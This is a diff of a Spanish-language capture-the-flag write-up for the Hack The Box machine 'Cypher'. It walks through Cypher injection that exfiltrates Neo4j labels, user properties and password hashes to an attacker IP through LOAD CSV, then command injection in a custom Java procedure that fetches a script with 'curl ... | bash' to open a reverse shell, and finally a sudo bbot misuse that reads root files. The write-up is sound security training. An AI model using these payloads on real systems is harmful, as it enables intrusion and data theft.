@@ -108,16 +108,16 @@ Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado 
 
 ## Web Enumeration
 
-
+Realizaremos a través de la herramienta de `whatweb` un reconocimiento inicial de las tecnologías que utiliza la aplicación web.
 
 ```bash
 ❯ whatweb -a 3 http://cypher.htb
 http://cypher.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.111.76], JQuery[3.6.1], Script, Title[GRAPH ASM], nginx[1.24.0]
 ```
 
+Al acceder a [http://cypher.htb](http://cypher.htb), nos encontramos con la siguiente página web en la cual dispone de 3 páginas web las cuales son las siguientes.
 
-
-
+En la página principal, al darle al botón de `Try our free demo` nos redirigre automáticamente a la página de iniciar sesión.
 
 {% tabs %}
 {% tab title="Home" %}
@@ -133,7 +133,15 @@ http://cypher.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[U
 {% endtab %}
 {% endtabs %}
 
+Al intentar acceder con credenciales predeterminadas como `admin/admin`, se nos muestra mensaje indicando que el acceso es denegado.
 
+<figure><img src="../../.gitbook/assets/imagen (468).png" alt=""><figcaption></figcaption></figure>
+
+Realizaremos una enumeración de directorios y páginas web en la aplicación web a través de la herramienta de `feroxbuster`. En el resultado obtenido, nos encontramos diferentes directorios y páginas los cuales los que nos llaman más la atención son los siguientes.
+
+* /api
+* /api/auth
+* /testing
 
 ```bash
 ❯ feroxbuster -u http://cypher.htb -t 200 -C 500,502,404
@@ -180,7 +188,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [####################] - 1s     30000/30000   57915/s http://cypher.htb/testing/ => Directory listing (add --scan-dir-listings to scan)  
 ```
 
-
+Realizamos una enumeración pero esta vez con la herramienta de `gobuster` entre la cual nos muestra el mismo resultado obtenido.
 
 ```bash
 ❯ gobuster dir -u http://cypher.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -b 503,404
@@ -209,7 +217,7 @@ Finished
 ===============================================================
 ```
 
-
+Al comprobar el contenido de la página web [http://cypher.htb/testing/](http://cypher.htb/testing/), nos encontramos que en el directorio disponemos de un archivo con extensión `.JAR`.
 
 ```bash
 ❯ curl -s 'http://cypher.htb/testing/' | html2text
@@ -225,7 +233,7 @@ custom-apoc-extension-1.0-SNAPSHOT.jar             17-Feb-2025 11:49
 
 ### Analyzing a JAR File (JADX-GUI)
 
-
+A través de la herramienta de `wget` nos descargaremos el archivo `JAR` que hemos localizado en la página web anteriormente indicada.
 
 ```bash
 ❯ wget http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
@@ -241,11 +249,17 @@ custom-apoc-extension-1.0-SNAPSHOT.jar                    100%[=================
 2025-03-04 16:14:11 (126 KB/s) - «custom-apoc-extension-1.0-SNAPSHOT.jar» guardado [6556/6556]
 ```
 
+Abriremos este archivo `JAR` en la herramienta de `JADX-GUI` para analizarlo en profundidad y comprobar si hay credenciales, configuraciones de la aplicación, etc.
 
+Este JAR define una clase `CustomFunctions` con un procedimiento de Neo4j llamado `custom.getUrlStatusCode`. Lo que hace es recibir una URL, realizar una solicitud HTTP usando `curl` para obtener el código de estado HTTP de la URL, y luego devolver ese código de estado como un resultado. Si la URL no comienza con "http://" o "https://", automáticamente agrega "https://".
+
+Además, la clase maneja la ejecución del comando y captura cualquier error que se produzca durante la ejecución, además de controlar el tiempo de espera de la operación.
 
 <figure><img src="../../.gitbook/assets/imagen (467).png" alt=""><figcaption></figcaption></figure>
 
+En resumen, este JAR proporciona una función personalizada en Neo4j que consulta el código de estado HTTP de una URL a través de la ejecución de un comando del sistema operativo (`curl`), lo que podría ser explotado si se permite inyección de comandos.
 
+Este JAR tiene una posible vulnerabilidad de inyección de comandos, ya que toma una URL proporcionada por el usuario y la pasa directamente a un comando del sistema operativo.
 
 {% code title="JAR file" %}
 ```java
@@ -261,27 +275,35 @@ custom-apoc-extension-1.0-SNAPSHOT.jar                    100%[=================
 ```
 {% endcode %}
 
-
-
-
-
 ### Cypher Injection on Login Panel
 
+Accederemos a http://cypher.htb e intentaremos acceder con las credenciales de `admin/admin`. Al interceptar la solicitud desde `BurpSuite`, comprobamos que se tramita por una solicitud por `POST` a `/api/auth` el inicio de sesión a la aplicación web.
 
-
-<figure><img src="../../.gitbook/assets/imagen (468).png" alt=""><figcaption></figcaption></figure>
-
-
+En este caso, en la respuesta por parte del servidor se nos muestra un mensaje de `Invalid credentials`.
 
 <figure><img src="../../.gitbook/assets/imagen (469).png" alt=""><figcaption></figcaption></figure>
 
+Al intentar ingresar un apóstrofe (`'`) en el campo de `username`, observamos que el servidor devuelve diferentes mensajes de error de sintaxis. En estos errores, podemos identificar que se está ejecutando `Cypher` y que la aplicación web valida el inicio de sesión mediante una consulta `Cypher`.
 
+```python
+  File "/app/app.py", line 142, in verify_creds
+    results = run_cypher(cypher)
+  File "/app/app.py", line 63, in run_cypher
+```
 
-'
+```cypher
+MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash
+```
+
+{% hint style="info" %}
+`Cypher` es un lenguaje de consultas utilizado en bases de datos gráficas, especialmente en `Neo4j`. Está diseñado para trabajar con nodos y relaciones en un grafo, permitiendo a los usuarios realizar operaciones como buscar, insertar, actualizar y eliminar datos dentro de una base de datos gráfica. Cypher utiliza una sintaxis declarativa, lo que facilita la escritura de consultas complejas de manera legible y comprensible.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (470).png" alt=""><figcaption></figcaption></figure>
 
+Dado que hemos comprobado que por detrás de la aplicación web se está utilizando `Cypher`, decidimos buscar como intentar explotar este lenguaje de consultas. Nos encontramos con los siguientes blogs los cuales nos explican diferentes PoC, inyecciones y definiciones sobre `Cypher Injection`.
 
+{% embed url="https://pentester.land/blog/cypher-injection-cheatsheet/" %}
 
 {% embed url="https://infosecwriteups.com/the-most-underrated-injection-of-all-time-cypher-injection-fa2018ba0de8" %}
 
@@ -291,14 +313,38 @@ custom-apoc-extension-1.0-SNAPSHOT.jar                    100%[=================
 
 {% embed url="https://hackmd.io/@Chivato/rkAN7Q9NY" %}
 
-
+Para recibir la información, deberemos de levantar un servidor web con Python, por ejemplo.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Realizaremos la siguiente inyección `Cypher` en la cual deberíamos de verificar la versión del servicio correspondiente. Por algún extraño suceso, no logramos que la información se nos envíe a nuestro servidor web, pero en la respuesta por parte del servidor, si se nos muestra la versión exacta del `Cypher`.
 
+```cypher
+' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.37/?version='+version+'&name='+name+'&edition='+edition as l RETURN 0 as _0 //"
+```
+
+<figure><img src="../../.gitbook/assets/imagen (475).png" alt=""><figcaption></figcaption></figure>
+
+Montaremos un servidor web para poder recibir la información correspondiente al `Cypher Injection`.
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Durante la prueba de inyección de `Cypher`, utilizamos la siguiente consulta para obtener todos los `labels` de los nodos de la base de datos `Neo4j`:
+
+Esta consulta realiza varias operaciones:
+
+1. `CALL db.labels()`: Obtiene todos los labels de los nodos en la base de datos.
+2. `UNION`: Combina el resultado anterior con la parte siguiente de la consulta.
+3. `LOAD CSV FROM 'http://10.10.16.37/?l='+label as l`: Envía la información de los labels a un servidor remoto (en este caso, a `http://10.10.16.37/`), lo que facilita la exfiltración de datos.
+4. `RETURN 0 as _0`: Retorna un valor constante (0) al final de la consulta.
+
+Este tipo de inyección permite obtener los labels de los nodos y, al mismo tiempo, filtrar la información hacia un servidor externo, lo que podría comprometer la seguridad de la base de datos al permitir la fuga de información sensible.
 
 ```cypher
 ' RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.37/?l='+label as l RETURN 0 as _0 //
@@ -306,7 +352,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <figure><img src="../../.gitbook/assets/imagen (471).png" alt=""><figcaption></figcaption></figure>
 
+Al explotar la vulnerabilidad de inyección de Cypher, logramos obtener una lista de los **labels** presentes en la base de datos Neo4j de la siguiente manera.
 
+La consulta permitió obtener los siguientes labels: `USER`, `HASH`, `DNS_NAME`, `SHA1`, `SCAN`, `ORG_STUB`, y `IP_ADDRESS`. Estos labels fueron enviados a un servidor web externo a través de solicitudes GET, lo que facilitó la exfiltración de información crítica sobre la estructura de los nodos en la base de datos.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -320,7 +368,14 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.111.76 - - [04/Mar/2025 17:00:54] "GET /?l=IP_ADDRESS HTTP/1.1" 200 -
 ```
 
+A través de la inyección de Cypher, se logró exfiltrar las propiedades de los nodos de tipo `USER` de la base de datos Neo4j utilizando la siguiente consulta:
 
+Esta consulta realiza las siguientes acciones:
+
+1. `MATCH (f:USER)`: Busca los nodos con el label `USER`.
+2. `UNWIND keys(f) as p`: Obtiene todas las claves (propiedades) de los nodos `USER`.
+3. `LOA`D CSV FROM: Exfiltra los valores de las propiedades a un servidor externo mediante el protocolo HTTP.
+4. `http://10.10.16.37/?p=value`: Cada propiedad y su valor son enviados como parámetros de una solicitud HTTP GET.
 
 ```cypher
 ' OR 1=1 WITH 1 as a MATCH (f:USER) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.37/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //"
@@ -328,7 +383,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <figure><img src="../../.gitbook/assets/5335_vmware_NQiFENqkTN.png" alt=""><figcaption></figcaption></figure>
 
-
+En el servidor web que disponemos montado, comprobamos que al tramitar la solicitud anterior, comprobamos que nos aparece como usuario el nombre de `graphasm`.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -336,9 +391,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.111.76 - - [04/Mar/2025 17:08:47] "GET /?name=graphasm HTTP/1.1" 200 -
 ```
 
-
-
-
+La inyección Cypher que realizamos tiene como objetivo obtener información de la base de datos de Neo4j, específicamente de los nodos de tipo `SHA1`. Manipulando la consulta, conseguimos acceder a las claves de estos nodos y extraer sus valores, como los hashes, enviándolos a un servidor externo a través de un archivo CSV. Esto permite obtener datos sensibles que podrían usarse para realizar ataques posteriores, como el cracking de contraseñas.
 
 ```cypher
 ' OR 1=1 WITH 1 as a MATCH (f:SHA1) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.37/?' + p +'='+toString(coalesce(f[p], 'NULL')) as l RETURN 0 as _0 //
@@ -346,7 +399,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <figure><img src="../../.gitbook/assets/5336_vmware_EdvfdX4xdx.png" alt=""><figcaption></figcaption></figure>
 
+En nuestro servidor web, hemos recibido un valor SHA1, específicamente el hash `9f54ca4c130be6d529a56dee59dc2b2090e43acf`. Este hash parece estar relacionado con el usuario `graphasm`, que habíamos encontrado anteriormente en la base de datos de Neo4j.
 
+Esto confirma que la inyección Cypher nos ha permitido extraer con éxito información sensible sobre los usuarios y sus datos asociados.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -354,11 +409,11 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.111.76 - - [04/Mar/2025 17:22:55] "GET /?value=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -
 ```
 
-
-
 ### Cracking Hashes (FAILED)
 
+Nos guardaremos el hash obtenido en un archivo llamado `hashes`, al utilizar la herramienta de `hashid` para verificar qué tipo de hash es, nos encontramos que al parecer se trata de cifrado `SHA1`.
 
+Al intentar crackear el hash con herramientas de cracking como `hashcat`, nos encontramos que el resultado ha sido `Exhausted`, indicando que no se ha logrado crackear el hash a través del diccionario `rockyou.txt`.
 
 ```bash
 ❯ echo '9f54ca4c130be6d529a56dee59dc2b2090e43acf' > hashes
@@ -380,56 +435,7 @@ OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8,
 ============================================================================================================================================
 * Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCU
 
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-
-Hashes: 1 digests; 1 unique digests, 1 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Early-Skip
-* Not-Salted
-* Not-Iterated
-* Single-Hash
-* Single-Salt
-* Raw-Hash
-
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory required for this attack: 2 MB
-
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344389
-* Bytes.....: 139921571
-* Keyspace..: 14344389
-
-Cracking performance lower than expected?                 
-
-* Append -O to the commandline.
-  This lowers the maximum supported password/salt length (usually down to 32).
-
-* Append -w 3 to the commandline.
-  This can cause your screen to lag.
-
-* Append -S to the commandline.
-  This has a drastic speed impact but can be better for specific attacks.
-  Typical scenarios are a small wordlist but a large ruleset.
-
-* Update your backend API runtime / driver the right way:
-  https://hashcat.net/faq/wrongdriver
-
-* Create more work items to make use of your parallelization power:
-  https://hashcat.net/faq/morework
-
-Approaching final keyspace - workload adjusted.           
+...[snip]...     
 
 Session..........: hashcat                                
 Status...........: Exhausted
@@ -456,7 +462,19 @@ Stopped: Tue Mar  4 17:43:46 2025
 
 ### Cypher Injection in Neo4j via a Vulnerable Java Procedure - Command Injection
 
+Al revisar el archivo JAR encontrado en [**http://cypher.htb/testing/**](http://cypher.htb/testing/), descubrimos una posible vulnerabilidad de `Command Injection` en el procedimiento llamado `custom.getUrlStatusCode`, que se utiliza para obtener el código de estado HTTP de una URL proporcionada. Este procedimiento ejecuta un comando en el sistema operativo subyacente sin una adecuada validación o escape de la entrada del usuario. Dado que este JAR está relacionado con Neo4j y Cypher, y hemos identificado previamente una vulnerabilidad de `Cypher Injection`, podríamos intentar llamar a este procedimiento vulnerable directamente desde nuestra inyección Cypher, lo que abriría la posibilidad de ejecutar comandos maliciosos a través de Neo4j.
 
+En este código, el parámetro `url` se usa directamente para formar un comando de shell que invoca `curl` para obtener el código de estado HTTP de la URL proporcionada. Sin embargo, no se realiza ninguna validación o saneamiento adecuado de la entrada del usuario, lo que permite la posibilidad de inyectar comandos maliciosos a través del parámetro `url`.
+
+Dado que el JAR está relacionado con Neo4j, una base de datos que utiliza Cypher para ejecutar consultas, podemos intentar aprovechar la vulnerabilidad de _Cypher Injection_ que ya hemos identificado en el sistema. Si logramos inyectar un payload en una consulta Cypher que invoque este procedimiento Java vulnerable, podríamos ejecutar comandos del sistema a través de Neo4j.
+
+Por ejemplo, al inyectar una URL maliciosa en el procedimiento `custom.getUrlStatusCode`, como `http://example.com; ls`, el comando ejecutado sería:
+
+```bash
+curl -s -o /dev/null --connect-timeout 1 -w %{http_code} http://example.com; ls
+```
+
+El uso del carácter `;` permitiría que se ejecuten comandos adicionales en el sistema operativo, como `ls` (listar directorios), lo que daría lugar a la ejecución no autorizada de comandos en el sistema.
 
 ```java
 @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
@@ -470,14 +488,25 @@ Stopped: Tue Mar  4 17:43:46 2025
         Process process = Runtime.getRuntime().exec(command);
 ```
 
-
+Para comprobar la existencia de la vulnerabilidad de `Command Injection`, levantaremos un servidor web en nuestro equipo atacante. Lo que haremos será intentar recibir una petición GET de un recurso inexistente. Si el servidor víctima realiza la solicitud a través de cURL y la recibimos en nuestro servidor, confirmaremos que se está produciendo una inyección de comandos.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+En esta inyección de Cypher, lo que estamos haciendo es aprovechar una vulnerabilidad de `Command Injection` en el procedimiento `custom.getUrlStatusCode` que vimos anteriormente. Este procedimiento es vulnerable porque permite ejecutar comandos del sistema operativo, específicamente usando `curl` para obtener el código de estado HTTP de una URL. Debido a la falta de saneamiento en la entrada de la URL, podemos inyectar comandos maliciosos.
 
+* `google.com;curl 10.10.16.37/gzzcoo;#`:
+  * `google.com`: Es la URL original que pasa como parámetro al procedimiento.
+  * `;`: Este es un delimitador de comandos en bash (sistema operativo tipo Unix). Lo que hace es permitir la ejecución de comandos adicionales.
+  * `curl 10.10.16.37/gzzcoo`: Después del `;`, se inyecta el comando `curl`, que hace una solicitud HTTP a nuestra máquina atacante (en la IP `10.10.16.37`) y al recurso `/gzzcoo`.
+  * `#`: El `#` es un comentario en bash, lo que asegura que cualquier texto después de este símbolo no sea ejecutado como código, evitando que la URL sea modificada en el proceso.
+* **Llamada al procedimiento vulnerable**:
+  * `CALL custom.getUrlStatusCode(...)`: Llamamos al procedimiento vulnerable `custom.getUrlStatusCode`, pasándole como parámetro la URL modificada que contiene el comando malicioso.
+  * `YIELD statusCode AS a`: Este paso recoge el código de estado HTTP devuelto por `curl` para la URL original (en este caso, `google.com`), aunque la ejecución real que nos interesa es la inyección de comando.
+* **Resultado final**:
+  * `RETURN a;`: Se devuelve el código de estado HTTP obtenido de la URL, pero la clave es que, al ejecutar este código, también se dispara la ejecución del comando `curl` hacia nuestro servidor web. Esto permite que nuestro servidor reciba una solicitud GET a `/gzzcoo`.
 
 ```cypher
 ' return h.value as a UNION CALL custom.getUrlStatusCode(\"google.com;curl 10.10.16.37/gzzcoo;#\") YIELD statusCode AS a RETURN a;//
@@ -485,7 +514,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <figure><img src="../../.gitbook/assets/imagen (472).png" alt=""><figcaption></figcaption></figure>
 
-
+Al realizar la inyección de Cypher, con el comando `curl` apuntando a nuestro servidor, verificamos en los logs de nuestro servidor web que efectivamente se hizo una solicitud `GET` desde el servidor vulnerable hacia el recurso `/gzzcoo` que no existía, lo que confirmamos con el siguiente mensaje:
 
 ```bash
 ❯ python3 -m http.server 80
@@ -494,22 +523,23 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.111.76 - - [04/Mar/2025 17:52:17] "GET /gzzcoo HTTP/1.1" 404 -
 ```
 
-
+El siguiente paso, será lograr obtener una Reverse Shell para así disponer de acceso al sistema. Para ello, crearemos un script en `Bash` que realice esta Reverse Shell, el script lo compartiremos a través de un servidor web.
 
 ```bash
 ❯ echo '#!/bin/bash \n/bin/bash -c "bash -i >& /dev/tcp/10.10.16.37/443 0>&1"' > shell.sh
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Por otro lado, nos pondremos en escucha con `nc` para poder recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Desde `BurpSuite` inyectamos el siguiente código para explotar la vulnerabilidad de `Cypher Injection` en combinación con el procedimiento vulnerable. El código que ejecutaremos es `curl 10.10.16.37/shell.sh|bash` con el cual realizará una petición hacía nuestro script y lo ejecutará en una `bash`.
 
 ```cypher
 ' return h.value as a UNION CALL custom.getUrlStatusCode(\"google.com;curl 10.10.16.37/shell.sh|bash;#\") YIELD statusCode AS a RETURN a;//
@@ -517,7 +547,7 @@ listening on [any] 443 ...
 
 <figure><img src="../../.gitbook/assets/5338_vmware_id1irDwicy.png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que finalmente logramos obtener acceso al sistema como el usuario `neo4j`.
 
 ```bash
 ❯ nc -nlvp 443
@@ -528,7 +558,7 @@ bash: no job control in this shell
 neo4j@cypher:/$ 
 ```
 
-
+Al recibir la Reverse Shell, la configuraremos para disponer de una TTY interactiva y poder realizar funciones como `Ctrl+C`, `Ctrl+L`, etc.
 
 ```bash
 neo4j@cypher:/$ script /dev/null -c bash
@@ -544,13 +574,11 @@ neo4j@cypher:/$ export SHELL=bash
 neo4j@cypher:/$ stty rows 46 columns 230
 ```
 
-
-
 ## Initial Access
 
 ### Information Leakage
 
-
+Revisando el directorio de `/home/graphasm` nos encontramos con la flag **user.txt** la cual con el usuario actual no disponemos acceso. Por otro lado, también existe un archivo `YML` que al comprobar su contenido, aparecen unas credenciales en texto plano supuestamente del usuario `neo4j`.
 
 ```bash
 neo4j@cypher:/home/graphasm$ ls -l
@@ -574,7 +602,7 @@ config:
 
 ### Trying access on SSH with recently found password
 
-
+Probamos de autenticarnos con estas credenciales para verificar si se reutilizan para el usuario `graphasm` y finalmente logramos acceder al sistema y visualizar la flag **user.txt**.
 
 ```bash
 ❯ sshpass -p 'cU4btyib.20xtCMCXkBmerhK' ssh graphasm@10.129.111.76
@@ -612,7 +640,19 @@ graphasm@cypher:~$ cat user.txt
 
 ### Abusing Sudoers Privilege (bbot)
 
+Revisamos si el usuario `graphasm` dispone de algún permiso de sudoers y nos encontramos que puede ejecutar como `sudo` el binario de `/usr/local/bin/bbot`.
 
+{% hint style="info" %}
+BBot, o BEE·bot, es una herramienta automatizada diseñada para facilitar tareas de **reconocimiento (Recon), pruebas de penetración (Bug Bounties)** y **Análisis de Superficie de Ataque (ASM, Attack Surface Management)**. Está inspirada en **Spiderfoot**, otra herramienta conocida para la recolección automática de información en el contexto de ciberseguridad.
+
+BBot se utiliza principalmente para automatizar la recopilación de información sobre una red, aplicación o infraestructura, ayudando en actividades como:
+
+* **Reconocimiento**: Proceso de recopilación de información pública sobre un objetivo para identificar posibles vectores de ataque.
+* **Bug Bounty**: Participar en programas de recompensas por errores, donde se identifican vulnerabilidades y se reportan para recibir compensación.
+* **ASM**: Ayuda en la gestión de la superficie de ataque de una organización, identificando activos y puntos vulnerables que pueden ser explotados.
+
+Al ser multipropósito, BEE·bot permite a los usuarios realizar un escaneo más amplio y eficiente de sus objetivos, mejorando la velocidad y efectividad en la detección de posibles vulnerabilidades y exposiciones de seguridad.
+{% endhint %}
 
 ```bash
 graphasm@cypher:~$ sudo -l
@@ -623,7 +663,9 @@ User graphasm may run the following commands on cypher:
     (ALL) NOPASSWD: /usr/local/bin/bbot
 ```
 
+{% embed url="https://github.com/blacklanternsecurity/bbot" %}
 
+Al verificar su panel de ayuda, nos encontramos con las siguientes opciones que ofrece la herramienta, investigaremos sus funcionalidades para poder localizar alguna vía para elevar nuestros privilegios a `root`.
 
 ```bash
 graphasm@cypher:~$ /usr/local/bin/bbot -h
@@ -749,11 +791,13 @@ EXAMPLES
         bbot -lf
 ```
 
-
-
 ### **Reading Privileged Files via BBOT Exploitation through Sudo Privileges**
 
+Tras investigar a fondo la documentación de la herramienta BBOT, encontramos el parámetro `-cy/--custom-yara-rules`, que permite cargar un archivo de reglas YARA personalizadas.
 
+En principio, BBOT espera que se le pase un archivo de reglas YARA, pero decidimos aprovechar esta funcionalidad para indicar que lea otro archivo del sistema, específicamente, acceder al modo debug para observar el comportamiento de la herramienta y poder leer archivos del sistema a nuestro antojo.
+
+En este caso, le indicamos a BBOT que el archivo de reglas YARA es el archivo `/root/root.txt`, activamos el modo debug y, utilizando el parámetro `--dry-run`, abortamos la ejecución después del escaneo. Esto nos permitió acceder a la flag de `root.txt`, ya que, como ejecutamos el binario con privilegios de sudo, obtuvimos acceso al contenido de este archivo restringido.
 
 {% embed url="https://www.blacklanternsecurity.com/bbot/Stable/modules/custom_yara_rules/" %}
 
@@ -769,104 +813,8 @@ graphasm@cypher:~$ sudo /usr/local/bin/bbot --custom-yara-rules /root/root.txt -
 
 www.blacklanternsecurity.com/bbot
 
-[DBUG] Preset bbot_cli_main: Adding module "stdout" of type "output"
-[DBUG] Preset bbot_cli_main: Adding module "json" of type "output"
-[DBUG] Preset bbot_cli_main: Adding module "txt" of type "output"
-[DBUG] Preset bbot_cli_main: Adding module "csv" of type "output"
-[DBUG] Preset bbot_cli_main: Adding module "python" of type "output"
-[DBUG] Preset bbot_cli_main: Adding module "aggregate" of type "internal"
-[DBUG] Preset bbot_cli_main: Adding module "dnsresolve" of type "internal"
-[DBUG] Preset bbot_cli_main: Adding module "cloudcheck" of type "internal"
-[DBUG] Preset bbot_cli_main: Adding module "excavate" of type "internal"
-[DBUG] Preset bbot_cli_main: Adding module "speculate" of type "internal"
-[VERB] 
-[VERB] ### MODULES ENABLED ###
-[VERB] 
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | Module     | Type     | Needs API Key   | Description                   | Flags         | Consumed Events      | Produced Events    |
-[VERB] +============+==========+=================+===============================+===============+======================+====================+
-[VERB] | csv        | output   | No              | Output to CSV                 |               | *                    |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | json       | output   | No              | Output to Newline-Delimited   |               | *                    |                    |
-[VERB] |            |          |                 | JSON (NDJSON)                 |               |                      |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | python     | output   | No              | Output via Python API         |               | *                    |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | stdout     | output   | No              | Output to text                |               | *                    |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | txt        | output   | No              | Output to text                |               | *                    |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | cloudcheck | internal | No              | Tag events by cloud provider, |               | *                    |                    |
-[VERB] |            |          |                 | identify cloud resources like |               |                      |                    |
-[VERB] |            |          |                 | storage buckets               |               |                      |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | dnsresolve | internal | No              |                               |               | *                    |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | aggregate  | internal | No              | Summarize statistics at the   | passive, safe |                      |                    |
-[VERB] |            |          |                 | end of a scan                 |               |                      |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | excavate   | internal | No              | Passively extract juicy       | passive       | HTTP_RESPONSE,       | URL_UNVERIFIED,    |
-[VERB] |            |          |                 | tidbits from scan data        |               | RAW_TEXT             | WEB_PARAMETER      |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] | speculate  | internal | No              | Derive certain event types    | passive       | AZURE_TENANT,        | DNS_NAME, FINDING, |
-[VERB] |            |          |                 | from others by common sense   |               | DNS_NAME,            | IP_ADDRESS,        |
-[VERB] |            |          |                 |                               |               | DNS_NAME_UNRESOLVED, | OPEN_TCP_PORT,     |
-[VERB] |            |          |                 |                               |               | HTTP_RESPONSE,       | ORG_STUB           |
-[VERB] |            |          |                 |                               |               | IP_ADDRESS,          |                    |
-[VERB] |            |          |                 |                               |               | IP_RANGE, SOCIAL,    |                    |
-[VERB] |            |          |                 |                               |               | STORAGE_BUCKET, URL, |                    |
-[VERB] |            |          |                 |                               |               | URL_UNVERIFIED,      |                    |
-[VERB] |            |          |                 |                               |               | USERNAME             |                    |
-[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
-[VERB] Loading word cloud from /root/.bbot/scans/shaggy_ella/wordcloud.tsv
-[DBUG] Failed to load word cloud from /root/.bbot/scans/shaggy_ella/wordcloud.tsv: [Errno 2] No such file or directory: '/root/.bbot/scans/shaggy_ella/wordcloud.tsv'
-[INFO] Scan with 0 modules seeded with 0 targets (0 in whitelist)
-[WARN] No scan modules to load
-[DBUG] Installing cloudcheck - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "cloudcheck"
-[DBUG] Installing stdout - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "stdout"
-[DBUG] Installing json - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "json"
-[DBUG] Installing txt - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "txt"
-[DBUG] Installing speculate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "speculate"
-[DBUG] Installing aggregate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "aggregate"
-[DBUG] Installing dnsresolve - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "dnsresolve"
-[DBUG] Installing excavate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "excavate"
